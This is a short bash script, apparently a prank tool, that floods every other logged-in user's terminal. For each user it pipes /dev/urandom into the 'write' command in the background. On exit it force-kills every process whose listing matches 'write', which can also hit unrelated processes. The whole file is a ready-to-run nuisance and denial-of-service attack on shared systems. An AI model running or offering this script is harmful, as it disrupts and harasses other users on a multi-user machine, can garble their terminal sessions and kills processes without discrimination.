#!/bin/bash
# Ever wonder why write is disabled by default on most servers?! 
# Look no further.

who | awk -F" " {'print $1'} | sort -u |
while read uname
do
if [ $uname == $USER ]; then
echo "No, you're ok"
else
`cat /dev/urandom | write $uname` &
fi
done

read -p "Return to stop the madness" 

ps -ef | grep write | grep -v grep | awk -F" " {'print $2'} |
while read process
do
kill -9 $process
done